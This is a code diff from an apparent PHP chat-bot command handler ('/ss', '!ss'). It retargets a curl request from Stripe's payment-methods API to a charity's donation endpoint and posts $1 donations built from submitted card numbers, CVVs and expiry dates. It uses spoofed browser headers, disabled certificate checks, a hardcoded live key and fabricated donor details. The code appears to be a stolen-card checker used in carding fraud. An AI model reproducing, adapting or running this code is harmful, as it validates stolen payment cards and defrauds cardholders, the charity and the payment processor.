@@ -163,24 +163,28 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
             
             if(!$stripeerror){
                 $ch = curl_init();
-                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+                curl_setopt($ch, CURLOPT_URL, 'https://www.charitywater.org/donate/stripe');
                 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                 curl_setopt($ch, CURLOPT_HEADER, 0);
                 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-                'Host: api.stripe.com',
-                'Accept: application/json',
-                'Accept-Language: en-US,en;q=0.9',
+                'Host: www.charitywater.org',
+                'Accept: */*',
+                'Accept-Language: en-US,en;q=0.5',
+                'Accept-Encoding: gzip, deflate, br',
+                'Origin: https://www.charitywater.org',
                 'Content-Type: application/x-www-form-urlencoded',
-                'Origin: https://js.stripe.com',
-                'Referer: https://js.stripe.com/',
-                'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'));
+                'Referer: https://www.charitywater.org/',
+                'Sec-Fetch-Dest: empty',
+                'Sec-Fetch-Mode: no-cors',
+                'Sec-Fetch-Site: cross-site',
+                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'));
                 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
                 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-                curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&billing_details[address][postal_code]=$zip&billing_details[address][city]=New+York&billing_details[address][country]=US&billing_details[address][line1]=13th+ave+st&billing_details[email]=jacobmaxon2%40gmail.com&billing_details[name]=jacob+maxon&card[number]=$cc&card[cvc]=$cvv&card[exp_month]=$mes&card[exp_year]=$ano&guid=$guid&muid=$muid&sid=$sid&pasted_fields=number&payment_user_agent=stripe.js%2F5121664f0%3B+stripe-js-v3%2F5121664f0&time_on_page=947892&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU");
+                curl_setopt($ch, CURLOPT_POSTFIELDS, "country=us&payment_intent%5Bemail%5D=jacobmaxon2%40gmail.com&payment_intent%5Bamount%5D=1&payment_intent%5Bcurrency%5D=usd&payment_intent%5Bmetadata%5D%5Banalytics_id%5D=30392ca2-9b13-4f72-9d96-9f0fbc2057c2&payment_intent%5Bpayment_method%5D=pm_1LNcyp4QFaGycgRKqZ7lrtPn&disable_existing_subscription_check=false&donation_form%5Bamount%5D=1&donation_form%5Banonymous%5D=true&donation_form%5Bcomment%5D=&donation_form%5Bdisplay_name%5D=&donation_form%5Bemail%5D=jacobmaxon2%40gmail.com&donation_form%5Bname%5D=jacob&donation_form%5Bpayment_gateway_token%5D=&donation_form%5Bpayment_monthly_subscription%5D=false&donation_form%5Bsurname%5D=maxon&donation_form%5Bcampaign_id%5D=a5826748-d59d-4f86-a042-1e4c030720d5&donation_form%5Banalytics_uuid%5D=30392ca2-9b13-4f72-9d96-9f0fbc2057c2&donation_form%5Bsetup_intent_id%5D=&donation_form%5Bsubscription_period%5D=&donation_form%5Bprofile_campaign_id%5D=&donation_form%5Bmetadata%5D%5Bfull_donate_page_url%5D=https%3A%2F%2Fwww.charitywater.org%2F&donation_form%5Bmetadata%5D%5Bphone_number%5D=%2B19174856485&donation_form%5Bmetadata%5D%5Bphone_number_consent_granted%5D=&donation_form%5Bmetadata%5D%5Bplaid_account_id%5D=&donation_form%5Bmetadata%5D%5Bplaid_public_token%5D=&donation_form%5Bmetadata%5D%5Breferer%5D=https%3A%2F%2Fcwtr.org%2F2nuqU8B&donation_form%5Bmetadata%5D%5Burl_params%5D%5Btouch_type%5D=1&donation_form%5Bmetadata%5D%5Bwith_saved_payment%5D=false");
                 $result2 = curl_exec($ch);
                 $errormessage = trim(strip_tags(capture($result2,'"code":"','"')));
             }
